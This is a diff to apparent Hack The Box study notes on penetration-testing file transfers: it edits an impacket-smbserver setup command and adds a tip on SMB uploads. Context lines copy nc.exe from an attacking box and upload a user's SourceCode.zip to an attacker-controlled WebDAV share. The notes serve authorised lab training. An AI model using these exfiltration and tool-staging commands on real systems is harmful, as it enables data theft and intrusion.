@@ -127,7 +127,7 @@ PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback
 
 - We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
 - **Steps**
-    1. Create the SMB Server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
+    1. Create the SMB Server `sudo impacket-smbserver -smb2support CompData /tmp`
     2. Copy a File from the SMB Server `C:\htb> copy \\ATTACKING_BOX\share\nc.exe`
 
 - New versions of Windows block unauthenticated guest access, as we can see in the following command: 
@@ -238,6 +238,8 @@ You can't access this shared folder because your organization's security policie
         - Connecting to the Webdav Share: `dir \\192.168.49.128\sharefolder`
         - Upload file `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`
 
+> [!NOTE]
+> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
 
 #### FTP Uploads
 
